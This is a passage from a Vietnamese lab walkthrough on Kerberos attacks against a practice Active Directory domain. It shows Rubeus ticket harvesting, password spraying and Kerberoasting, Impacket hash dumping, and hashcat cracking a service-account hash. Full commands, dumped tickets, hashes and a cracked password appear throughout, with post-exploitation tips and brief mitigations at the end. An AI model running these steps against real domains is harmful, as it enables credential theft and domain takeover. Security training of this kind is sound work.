    D7OORnAJlY57l82CxmEZdxXKk9d8rJMZKbo1nfnFVhe/6Mju/KIh3muzZZbOr4aZvDLbmvXDsstFt+7WDwA2awEmE9VeEwYSmDZo
    1lAkc9PRqpW3XdhZMHJO1mH/LbdJmB/1polMAqWvDFkTimdq2ffuVrUGjsg9pHq6HeqbLCBaTxzHm6HHGKdV3jC7xV54EE0cxMTP
    LgrERGjkiie4eOubY7Lwd8GJJM9c2FBXTfeu4Tcoi768Pi8bvRwdvGKWNRuE7NRk7QvKagIpGQQ154oq2VcliDwf7IjY140oEJTu
    7yy+bvJBUa2EQoRdXDEIj/BaNrJZnpt1WS7gls6mHldCRtrSrD7lzFlMGKlngGSXzElOQrcbuDiCx0E0/rahUiYgBe5CyZ9SRl0z
    SlLlijLLlU5YC+WK64pn0tKdEnYC2xvgK2GFLM2y5UCypwOzWellScfaJ4jnB76912XY5hyp5GDB1DBy3KCaija2+0g4Zt1bJBHS
    O7Ss3UP28sRfj+R9G8tTWq7dMGjBsj+k2qGCzlgNpT4ovaNzu9q6lgCjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCA2N/dpZkN86A5g8O6zQ61qAsDxcGUktNhof+D04Ukd3aESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDI2MDYyMjExNTkxM1qmERgPMjAyNjA2MjIyMTU5MTNapxEYDzIwMjYwNjI5
    MTE1OTEzWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  6/22/2026 5:50:57 AM
  EndTime               :  6/22/2026 3:50:57 PM
  RenewTill             :  6/29/2026 5:50:57 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGmviV7XGVNJla9y644et3J0tTTfpUWr7VcV0
    kKo0V7V5AkCozvSor0/aC00lJsrp3mcr7FeAAFXFThlV6PgqRbLv6T2ttMveCUt098kCe2QfNGnQ/Q8GrM33q2vugGvlqXDLkk6P
    w26gsPVc5WNfw3FzBRfui0izPvsi6UgYYWUaaKA1NiZ2y9L0hByKXwpX8R7VTz8kVrAXpm1fIkGdp4VO5azTVGAxysP0W7JVuezs
    hg1AbJOdOHyUUAEuBqUqFgUqupU6ZEfgRsrTYIhRAfYa/M9hCMYINdeQ5uBiPgdlu409aONMhWDpQiOzB2wHghSfjtEDekUaZy5n
    Z/u9wSsWeSq1znwYZ1/nUKGNazrJDodFNB2nPhiz1pa//iiTeR5VCAUPo9oByPMxhk2JszocuRBL1A0wHxKPk2y1IDVnSKpcciwh
    FUiW/b5CbgdsR55LWDDHBiH3NVQcrKd78arV9saGJt6AKfkydQBmzs1/M+54rWQrpsjfbSNNT3u/2VDlPu+2xUbt77g0H4gF4h/R
    zcUHkK3XJoVenjcAYvnYeF97bTcMwjvPjq3D5rbuom+hg4YfpI4sfkjKOmLFCkPlrc4MpY+MzNI+9Rj1+uTrV44fhJy8dCR5fCP1
    Wx+Jiu9olCieqiOLXZssGhAbF0ry6UuSN1Gfg4GNGLd/FvL1SyIHM5CIZGRxgsS/STPTMj9Pq/A9ug+QsKagKD7GyEu9U+Floxo1
    voK8VLXYyQRumOfuoKcWQd44d7daZEmXh9NmrpGvPsXWzLGbgpg64at3yQrKg2M45YYs7iItmaE6cT20jPQhfLQT8m0ll4FyFxuC
    aB0E2xepQlOdcqoMW48/TspCq6/VqRQg8YGHo0miohm5PM56OmA8ImZxew/aR6T5U2psffXIbBy6t6aswj3pKnb/84SUzuzNaFAX
    2GLvre6zxUNChRCyD4OhrSlBnODetl/vtkPkSGYk3cA1Z0+6+EDAGEuTSaEvU66aEsjQYXL0o8rTmUcoCu93IJOpdjp99zup3598
    gla/Fa0dg1hOBxqyM+QZQndL52Yz6+P7lAHJBk8q5kv/4rMeqsIucHqTTqPBTUbFQwWe/glKlxR5SP9AxYEGItZmz5bJvhP9c1xc
    CAG5t1LIjmYDnrPQK7MHDuDFlfSVULEFGpTTV/TJn8jNkmlyrf6h+uP2MLchuXAHdnhGnnp4zaOItehwrgiG3IXK1S7VSC8rHgWr
    1mQA5q3visxzSFeEqs3n0ED9Q4j2bju5O3w8LIdBJ1fsWKEjCle7aPzLwwWNPJvqlaejwVDbFHUCkGU9EXz4evrYutJa0YVBp7n0
    wrNBG//ISqcgHoE9I8qsaYYgsAKS/SfR5kfxE+8xnnprIgoty7zWB+XkCzOaYMjafqOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEINxPB2Ev4c3CKEVsUlz9L+2WihT9Mm5vGBIrdehCTtcIoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjYwNjIyMTI1MDU3WqYRGA8yMDI2MDYyMjIyNTA1N1qnERgP
    MjAyNjA2MjkxMjUwNTdaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=

[*] Ticket cache size: 5
[*] Sleeping until 6/22/2026 5:54:52 AM (30 seconds) for next display

```





### Brute-Forcing / Password-Spraying w/ Rubeus -&#xD; &#xD;

Rubeus có thể thực hiện cả brute force mật khẩu lẫn password spraying đối với các tài khoản người dùng.

* Brute force mật khẩu: sử dụng một tài khoản người dùng duy nhất và thử lần lượt các mật khẩu trong wordlist để tìm mật khẩu đúng của tài khoản đó.
* Password spraying: sử dụng một mật khẩu duy nhất (ví dụ `Password1`) và thử nó trên tất cả các tài khoản người dùng đã tìm thấy trong domain để xem tài khoản nào đang sử dụng mật khẩu đó.

Kỹ thuật này sẽ lấy một mật khẩu Kerberos đã biết và thử nó trên toàn bộ người dùng trong domain. Nếu thành công, Rubeus sẽ trả về một ticket `.kirbi`.

Ticket này là một TGT (Ticket Granting Ticket), có thể được dùng để:

* Yêu cầu service ticket từ KDC.
* Thực hiện các cuộc tấn công khác như Pass-the-Ticket.

Trước khi thực hiện password spraying bằng Rubeus, bạn cần thêm tên miền của Domain Controller vào file `hosts` trên Windows. Có thể thêm địa chỉ IP và tên miền vào file `hosts` bằng lệnh `echo`.

`echo 10.49.148.12 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

1.) `cd Downloads` - navigate to the directory Rubeus is in

2.) `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user&#x20;

Tham số `/noticket` yêu cầu Rubeus chỉ kiểm tra thông tin xác thực mà không lưu hoặc trả về ticket Kerberos. Nếu bỏ tham số này, khi thành công Rubeus có thể trả về TGT dưới dạng `.kirbi`.

```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticket

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7T6zBznGrJkKGFeu1zujg5/jxabsvK5UZ6mg/GxqNKZpxBd3hqqcfmCPvnxYMv2N83K6oXhGaEyQ
      D47Qsxb8XiFG1mQ0UrxIVG88RYVU1JMT62l+hf5aR9PVGRV6/t4SWI0GqjSTrshbwdyvCGraSXnUbGRR
      cXxi9ubA1uXt1KiOcGgibvbg8tpmVHr5wvBpJImVNgmHODBE86x8OVI82ExXziys7Ojk10JKKd8Vk1LJ
      aHAtTpDspK8HS8FSe/IVlKyTXJ65BQcWFywpVoW0AnQqJDE5ZDSDAm6+xl8OYDB9N7vM1bkh1mNu9nOO
      MgvEh0Q7UJqdkztZP/I57vMKod7C6BILOU+ftoEyeW8VUexaLYLv9zCnn6z/fIp1mYHlkx3wBs+MJVly
      FVjsB1XtHp1UZfyYA6m6Gw+hnTDcvikihriebY1B9iv+OM3Wzn6q0i7pyjZ5awWte8JKvDKioLCU3m1z
      +YAcw5LFq2MXhyg2+JwsA0D4z+0PkfKuo8VyNZ+oP67Q/n6CR4RaBLsQGreROVtmfVo7Q359Z2tJ3Fij
      FV2geDCEQPH00lzlUOimD/YaOOf1fl0/rgGiPQHH07ph7M2GtGRb8mJu2SnZN9ijwyHURPLfQQafdL5i
      vl3Qirpb8ySiV+BTlkRcmS3YaFjjGKeCi30EuaNKE7oVHahYhRanJfXszFFL2aQhr7/WizdL5g41TlCj
      TVL3N4CAGwsNilLC7LEWdLsvwruF4U1t1g+ZqvdBNtMzpHkYwBR19KzvuCgrkH/UCZRtsHuI5OCBUdAN
      cOq47PtMPLzXUkMibNBm5dlCsKvarhP+kuAGFcMrMW6CGplz0mkl6zxuQYSrk/oydgzFM4e8x2PH/8F/
      er2b+aDtnQUPP+LK/ycXWUFpTb4NC7IaYlFs2js5k+A0KWbxN9Hb9ewykURvJdYaS2nLk2mDJGZHjkIh
      8/oRiUDIvUhMXg8y8fCzB9Wnae5cOVhkOflOzAr8+pxOQYf9Nzj5PSHZOgVSPIdePTF0S+bru1QDRpm9
      qwA64MshkDaf7jOdFAmlUYg4LL6TA8vbT8JywUJarM8u8UoUmWvNfeN02LyOe6TKgW9+yJsyFwOT7TI7
      VVGGn7YciHQd8QzgHDP5ibBygUgPf0Fyv4UrsV0l7DtFTMNBfQEJ/RYhe7ziUpZH5yMlGjhhpccK5koc
      7irfRwF2wA7DCLe31h6gPx0nVNkM4L6da27nOe6wyK8p+QIZZJB8ODyYJbylS18sOA014gxGqUqrhyWu
      vPIsb6KTct0WMjzmieLZLqEaXpuAa1U9vVhG+vURyAQaUjL+eXLkAi5v9AEOZvvyPqOB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEICzUs3GlNLLhs14SdYp+QBXDfQI2AUISc4Op
      3z8f2cMXoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDI2MDYyMjEyNTczNVqmERgPMjAyNjA2MjIyMjU3MzVapxEYDzIwMjYwNjI5MTI1NzM1WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done
```

<figure><img src="../.gitbook/assets/image (971).png" alt=""><figcaption></figcaption></figure>



## Kerberoasting w/ Rubeus & Impacket ﻿﻿

### lí thuyết

Trong nhiệm vụ này, chúng ta sẽ tìm hiểu một trong những kỹ thuật tấn công Kerberos phổ biến nhất – Kerberoasting.

Kerberoasting cho phép một người dùng yêu cầu service ticket cho bất kỳ dịch vụ nào có SPN đã được đăng ký, sau đó sử dụng ticket đó để crack mật khẩu của service account.

Nếu một dịch vụ có SPN đã được đăng ký thì nó có thể trở thành mục tiêu của Kerberoasting. Tuy nhiên, mức độ thành công của cuộc tấn công phụ thuộc vào độ mạnh của mật khẩu, khả năng crack được mật khẩu đó, cũng như các quyền mà service account sở hữu sau khi bị crack.

Để enumerate các Kerberoastable account, ta có thể sử dụng công cụ BloodHound để tìm tất cả các tài khoản có thể bị Kerberoast. Công cụ này cho phép bạn xác định những tài khoản nào có thể bị Kerberoast, liệu chúng có phải Domain Admin hay không, và chúng có những mối quan hệ nào với phần còn lại của domain.

Nội dung đó hơi vượt ra ngoài phạm vi của bài lab này, nhưng đây là một công cụ rất hữu ích để xác định các tài khoản mục tiêu cần nhắm tới.

Để thực hiện cuộc tấn công này, chúng ta sẽ sử dụng cả Rubeus và Impacket nhằm giúp bạn làm quen với các công cụ khác nhau dùng cho Kerberoasting. Ngoài ra còn có những công cụ khác như kekeo và Invoke-Kerberoast, nhưng tôi sẽ để bạn tự tìm hiểu thêm về chúng.





### Kerberoasting w/ Rubeus -



```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>dir 
 Volume in drive C has no label.                                        
 Volume Serial Number is E203-08FF                                      
                                                                        
 Directory of C:\Users\Administrator\Downloads                          
                                                                        
05/25/2020  03:45 PM    <DIR>          .                                
05/25/2020  03:45 PM    <DIR>          ..                               
05/25/2020  03:45 PM         1,263,880 mimikatz.exe                     
05/25/2020  03:14 PM           212,480 Rubeus.exe                       
               2 File(s)      1,476,360 bytes                           
               2 Dir(s)  50,905,120,768 bytes free      
```



```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe kerberoast

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  
                                         
  v1.5.0                                 
 

[*] Action: Kerberoasting 

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 

[*] Searching the current domain for Kerberoastable users 

[*] Total kerberoastable users : 2 


[*] SamAccountName         : SQLService 
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local  
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111 
[*] PwdLastSet             : 5/25/2020 10:28:26 PM                          
[*] Supported ETypes       : RC4_HMAC_DEFAULT                               
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$B1D8538D0010BD6619AEA523AEF414DD$1503DE198CD6DB46FFD855226164727762ED4B 
                             33E8C45C0F3C04AC3649020D995EABBBE335EA6CDE18273B785B0D312BF1288799FA6968F0673879
                             D28030EA819857877EE8ACF4EE42942E4510B4C59B0A7CAE19D62DB4F0D37916FC5010B087974DF1
                             84CA6BEE8DF97AAE450EE148156778C3A7983C016DE3980E44F621248DB95117F79E4B7B525DFD56
                             804FF70BAA821357ED2EE5B8EE6480608E5AE3CB21579FDE2B990DA5315886D7CE11A281FEF36135
                             E25EA0C8A0C00054E4729133F3C0039A263A4E931709171EB8760200EEBA74E835B792ABBEF2FDFB
                             390639D776C1C6F125F3FFB39A6BDB31B2A721090D81F5EAF7F41DF9EE442F0C5B0C971FFA169A58
                             DA32AE8B6D3D5F069444646A439A95FE2DDE70BD623A0E56555EDE2D3A4B35E0E28BF009F042A04D
                             C0E4391BF571CF9647D6BF4142494EA2EADBCAF2BF8B1D3D28595BEFD0DB8A05B91E383917CC28E5
                             16F6F256AB45AF139DA581255CC0C263E9DDECD62667539138A20D3B774FF6E642E72FDCA51E661B
                             D414DA384FE959249F7D16F3A0A2FD66EE79BAED99D7EB3CD52593415C9BF2D43710B891C709150F
                             7B13B2D193295EDC646AF5A2A27275E8B2D8385069B176C229E4C3C2D374FDE3F97A38FA274680C8
                             E5E2ECB223BBFB0AA35322BE59838E219B54A10224F0A39C24571BD4EF1078B7086FD1A0B0C4EB3D
                             4449FEA25CA1529CF19100670363BAF9AB5F38311CF4D1A03EAC6D4DBB028A42D9992EDB9564E61D
                             FA61F91DFC590FDA8A6665DFE95B02DCE4853FACE3722D7426DC2A8405038A63037AE208F6ABFE47
                             258325C494CE0542218DD6B7FFEDEF4458FC8AD2097596A817B12D3189FF6A41F02E6FA9C018D34A
                             6CA8B838C9A196A952FD4105A6C3CCB9C5E8E3DE7990E80CFC12A37F3E424C575210B9712172AF7F
                             156248B4DDE215189E6BED22CDC92CD13DE7A0B2F4F3CBF47D2A65E954E88B479BCEBE06A7ABF67F
                             B1611BADF68F40A56E52E40A972DB3D65EABCFD30A339FE6AAA732325E20890E7E8EA67D06A232DE
                             EEE82D2332D822168905C68E736011E892327DD453EDADEE3E77058D798E45737170373771C4662E
                             DF9837F28F4ADE7237701B5ADCDBFABAD4CB160291B8A7408E92067D1D69E68CEEA6396A195AF753
                             BE144C51E5F16D3156408F20AB4B9259D327B2C60A0EB8E532ED7300BC8FDDEE4239084D0E7B0C15
                             DE6FE93EDB4D22ED0E1F972ECF019BC297D74B3AFF8B95FEE4346F29D4A28E4E04F96AE54EFCAEA8
                             5D8B01C25C07FAE724D7188D30F2D2D387B23054DBFB9E63A00FA45EE6EA559E648B3F1E87945961
                             C27F2C490D50F9952B4B8AA286DD37087425E891B1D324E7ABF63ED35A07B655D5DEB0C9D117DD34
                             70B99EC67EF7A1B24F68E92E7BF146C7E9766777E7A774AECB15706F47525AEF5841F86E2F927916
                             87B9F6F4F711B0842F7DA84C577E8FAD08B3EA5B47843A28AC3AC3EDC38E40A2F593570924DAA482
                             6DDE509B1A29FA257DB2F6B94F69920AFCD245E444A1FC61C298A833794503714E7CBBFF849662C3
                             62739D2A5EAEECC2DB9D83AEB038EC120B7E5EE439618FA5839058C9C050CF07078A734C5C26965F
                             DFC2C38F43C00A26E4AF4DD27509ACD30416A617ABF0200C7B19D6A846


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$2A1A4C5F7206D119C881C8E2DD07FB9F$9073C3F71B3134F5C7DD6485387B8A8E406F
                             317DE159DD03DE0A8BB4C182FA150F57517FC1D57E4CBBA4C213ADE6CF3C20ACEC715C12B26955E9
                             8EB99B677D4150479F793387C9E5D3A6BC79C109A9B8FA025B697FD8653D043BBD1271E0649AFC38
                             55998810B5D3122441A7B2203F32D97FC454F8056272F744F8D3AFA75D2E949BDBED2C9E92CBEDD4
                             E53062B933555E0DEB4851942AB87578EEE02AC87EC9815C5B40D68F8EE06D17100BC716DB529CAE
                             AFBCCFDABEDF0A7025E3C5503DD3713F92CE6D0612CD632AA014628D76A006CBFF43CD4FFB85673C
                             359E31B2C21D14A0487D27D6DAB3D5C799A181B3A5B9D6BC653C1606FC634355CFCF06F5F9EA002F
                             2D51840ACEB5A37D45C32EDF6F0A0A25799D801F0CDE74C9FB4690958D0375277029A3C945727CD9
                             6A34E55EF4697D37FB59260F996B6711FCD5A0B23E14DDA62E65C15240781D80545EB0578F84ED2B
                             A8477884171B68C45441FA6E0220A1632D3FE2207BF5F27506E3B362141BE86718D5EF325CB7794C
                             88FB3609F615B005A6865593930E06EC76C630273EF2402AE9FAB752F7483DAB23802E229E83DE1B
                             A1683FD95024D6933587BCA3C0189BCCFA27450195C1677DDD7DF98DD90AADDE6673909F573E8E96
                             A2DA7295A6A6AD46632E1F832FA0B07A51E7D8A41930424EF0C6859733147753E4629C61228A3463
                             6F38234C3F3FAE23E216E3C6D9CE5E5B9E7E6FB45310C021D4E549AA304591C2E9ADEA4B76BD8085
                             891C327F92B1C50C122BCE01D0779724787DA53FBB2DB481EAE7B3FE94C83C00E335E993054DAD24
                             CFA64E672DED90D21E62FC9EF33AF266EE23A6F2CA655F6867B9E8D8F342B8C646249D45630D741D
                             9AE9844695F3D8B75349262FC4628DA99B6E8516CEB247668BB09296C7C8C733AC647900AFEFFF6D
                             9D6C55593085BB4D39C606BC5C160E7B192128E98208C77ABE862A908772891962CD6B5C6B2A4C52
                             80DA39F6220675A0C439C525D6410EC0B5147FD22F1438EF7BFE660B52AC130B267BBBD7BD27B64D
                             9802B7A1506A8B097C74A13F14E534668B28D61B7D9F019296D25AAE002242354697B2F99990C83A
                             FF9ED60A19AE8F2CA231E6AFE7857074B509C61B6FDF3DCD091728A0E8F7F88128A4364EA4981FCB
                             8B1B6FFFC214A76CDED02A559191EE17DFADA27BD9BD622E3FB2528F254EDF08E6AD89D4E8E88442
                             9A18E3B14D2D9E3EAF6DEE2577DC467151D3FA4EDEF4B6AA4A01C6958539C3C75B8ECC2CA8CD6C72
                             8BDD1C1C8919ED429F432C070A6A6ED3DD413C4407E295ED499759FF8CD00D8F4EF002870389A89F
                             374A5039802727A10579AFD22C36248503A88D4EC6E24E7B1156E956F37DE47451E27891540DCD92
                             48EFDD09D1FC8F159D3C48FAB1161320CC6B87F1A733187FBD62FACD20C864AF5F8CEA1127BDC4B5
                             0795DFB2A75BA92C15137063408DEFB80C45B8D5F0CB27489058A599D21CBCA749CC34CCA4499BDA
                             2A61C212AC8EC103664493519C7F6E1D290DD7593E9C848CEA35014E939F77E94DB3DC339EE76A91
                             D9FA28389B8CC2BC898F058C731E173DF53EE79C9835E9B634EEC2DABBDFE610868C354132BAA425
                             EEEC404E6243A2FBD34717EC82C160FE743212F0D588CB4470B161482462

```



```bash
(base) ┌──(kali㉿kali)-[~]
└─$ hashcat -m 13100 -a 0 sql.txt p.txt   

hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12450HX, 2336/4673 MB (1024 MB allocatable), 7MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (4466 MB free)

Dictionary cache hit:
* Filename..: p.txt
* Passwords.: 1240
* Bytes.....: 9706
* Keyspace..: 1240

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Hashcat is expecting at least 7168 base words but only got 17.3% of that.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111*$b1d8538d0010bd6619aea523aef414dd$1503de198cd6db46ffd855226164727762ed4b33e8c45c0f3c04ac3649020d995eabbbe335ea6cde18273b785b0d312bf1288799fa6968f0673879d28030ea819857877ee8acf4ee42942e4510b4c59b0a7cae19d62db4f0d37916fc5010b087974df184ca6bee8df97aae450ee148156778c3a7983c016de3980e44f621248db95117f79e4b7b525dfd56804ff70baa821357ed2ee5b8ee6480608e5ae3cb21579fde2b990da5315886d7ce11a281fef36135e25ea0c8a0c00054e4729133f3c0039a263a4e931709171eb8760200eeba74e835b792abbef2fdfb390639d776c1c6f125f3ffb39a6bdb31b2a721090d81f5eaf7f41df9ee442f0c5b0c971ffa169a58da32ae8b6d3d5f069444646a439a95fe2dde70bd623a0e56555ede2d3a4b35e0e28bf009f042a04dc0e4391bf571cf9647d6bf4142494ea2eadbcaf2bf8b1d3d28595befd0db8a05b91e383917cc28e516f6f256ab45af139da581255cc0c263e9ddecd62667539138a20d3b774ff6e642e72fdca51e661bd414da384fe959249f7d16f3a0a2fd66ee79baed99d7eb3cd52593415c9bf2d43710b891c709150f7b13b2d193295edc646af5a2a27275e8b2d8385069b176c229e4c3c2d374fde3f97a38fa274680c8e5e2ecb223bbfb0aa35322be59838e219b54a10224f0a39c24571bd4ef1078b7086fd1a0b0c4eb3d4449fea25ca1529cf19100670363baf9ab5f38311cf4d1a03eac6d4dbb028a42d9992edb9564e61dfa61f91dfc590fda8a6665dfe95b02dce4853face3722d7426dc2a8405038a63037ae208f6abfe47258325c494ce0542218dd6b7ffedef4458fc8ad2097596a817b12d3189ff6a41f02e6fa9c018d34a6ca8b838c9a196a952fd4105a6c3ccb9c5e8e3de7990e80cfc12a37f3e424c575210b9712172af7f156248b4dde215189e6bed22cdc92cd13de7a0b2f4f3cbf47d2a65e954e88b479bcebe06a7abf67fb1611badf68f40a56e52e40a972db3d65eabcfd30a339fe6aaa732325e20890e7e8ea67d06a232deeee82d2332d822168905c68e736011e892327dd453edadee3e77058d798e45737170373771c4662edf9837f28f4ade7237701b5adcdbfabad4cb160291b8a7408e92067d1d69e68ceea6396a195af753be144c51e5f16d3156408f20ab4b9259d327b2c60a0eb8e532ed7300bc8fddee4239084d0e7b0c15de6fe93edb4d22ed0e1f972ecf019bc297d74b3aff8b95fee4346f29d4a28e4e04f96ae54efcaea85d8b01c25c07fae724d7188d30f2d2d387b23054dbfb9e63a00fa45ee6ea559e648b3f1e87945961c27f2c490d50f9952b4b8aa286dd37087425e891b1d324e7abf63ed35a07b655d5deb0c9d117dd3470b99ec67ef7a1b24f68e92e7bf146c7e9766777e7a774aecb15706f47525aef5841f86e2f92791687b9f6f4f711b0842f7da84c577e8fad08b3ea5b47843a28ac3ac3edc38e40a2f593570924daa4826dde509b1a29fa257db2f6b94f69920afcd245e444a1fc61c298a833794503714e7cbbff849662c362739d2a5eaeecc2db9d83aeb038ec120b7e5ee439618fa5839058c9c050cf07078a734c5c26965fdfc2c38f43c00a26e4af4dd27509acd30416a617abf0200c7b19d6a846:MYPassword123#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER...d6a846
Time.Started.....: Wed Jun 24 08:30:30 2026 (0 secs)
Time.Estimated...: Wed Jun 24 08:30:30 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (p.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   266.7 kH/s (0.88ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1240/1240 (100.00%)
Rejected.........: 0/1240 (0.00%)
Restore.Point....: 0/1240 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> hello123
Hardware.Mon.#01.: Util:  3%

Started: Wed Jun 24 08:30:29 2026
Stopped: Wed Jun 24 08:30:32 2026

```



### Kerberoasting w/ Impacket -&#x20;

1.) `cd /usr/share/doc/python3-impacket/examples/` - navigate to where GetUserSPNs.py is located

2.) `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.49.154.185 -request` - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash



### What Can a Service Account do?&#xD; &#xD;



Sau khi crack được mật khẩu của service account, có nhiều cách để thu thập dữ liệu hoặc khai thác thêm, tùy thuộc vào việc service account đó có phải là Domain Admin hay không.

Nếu service account là Domain Admin, bạn sẽ có mức độ kiểm soát tương tự như khi sở hữu Golden Ticket hoặc Silver Ticket, và từ đó có thể thu thập các dữ liệu giá trị như dump NTDS.dit.

Nếu service account không phải là Domain Admin, bạn vẫn có thể sử dụng tài khoản đó để đăng nhập vào các hệ thống khác nhằm pivot hoặc privilege escalation. Ngoài ra, bạn cũng có thể dùng mật khẩu đã crack được để password spraying lên các service account hoặc tài khoản Domain Admin khác; nhiều tổ chức thường tái sử dụng cùng một mật khẩu hoặc các mật khẩu rất giống nhau cho service account và tài khoản quản trị.

### Kerberoasting Mitigation -



<figure><img src="../.gitbook/assets/image (973).png" alt=""><figcaption></figcaption></figure>

### &#xD;

* Strong Service Passwords - Nếu mật khẩu của service account đủ mạnh thì Kerberoasting sẽ không hiệu quả, vì ticket thu được sẽ rất khó hoặc không thể crack trong thời gian hợp lý.
* Don't Make Service Accounts Domain Admins - Không nên cấp quyền Domain Admin cho service account. Thông thường service account không cần đặc quyền này; nếu service account không phải Domain Admin thì tác động của Kerberoasting sẽ giảm đáng kể ngay cả khi kẻ tấn công crack được mật khẩu.



AS-REP Roasting w/ Rubeus\



Rất giống Kerberoasting, AS-REP Roasting dùng để lấy các hash krbasrep5 của những tài khoản có Kerberos pre-authentication bị tắt. Khác với Kerberoasting, các tài khoản này không cần là service account. Điều kiện duy nhất để một user bị AS-REP Roast là tài khoản đó phải có pre-authentication bị vô hiệu hóa.

Chúng ta sẽ tiếp tục sử dụng Rubeus giống như khi làm Kerberoasting và ticket harvesting vì Rubeus có lệnh AS-REP Roasting rất đơn giản và dễ hiểu. Sau khi dump được hash bằng Rubeus, chúng ta sẽ dùng Hashcat để crack hash krbasrep5.

